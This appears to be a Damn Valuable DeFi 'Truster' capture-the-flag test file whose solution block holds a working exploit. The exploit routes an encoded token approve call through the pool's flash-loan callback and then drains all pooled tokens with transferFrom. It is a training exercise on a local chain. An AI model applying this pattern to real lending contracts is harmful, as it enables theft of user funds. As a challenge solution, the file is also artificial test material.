const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, player;
    let token, pool;

    const TOKENS_IN_POOL = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, player] = await ethers.getSigners();

        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();
        pool = await (await ethers.getContractFactory('TrusterLenderPool', deployer)).deploy(token.address);
        expect(await pool.token()).to.eq(token.address);

        await token.transfer(pool.address, TOKENS_IN_POOL);
        expect(await token.balanceOf(pool.address)).to.equal(TOKENS_IN_POOL);

        expect(await token.balanceOf(player.address)).to.equal(0);
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        //// Create data
        let ABI = ["function approve(address spender,uint256 amount)"];
        let iface = new ethers.utils.Interface(ABI);
        let amount = await token.balanceOf(pool.address);
        let data = iface.encodeFunctionData("approve", [player.address, amount]);
        //// flash loan and call to give allownace for the attacker
        await pool.connect(player).flashLoan(
            100,
            pool.address,
            token.address,
            data
        );
        //after exploited
        console.log(`allowanc(pool, player): ${await token.allowance(pool.address, player.address)}`);
        await token.connect(player).transferFrom(pool.address, player.address, amount);
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player has taken all tokens from the pool
        expect(
            await token.balanceOf(player.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await token.balanceOf(pool.address)
        ).to.equal(0);
    });
});

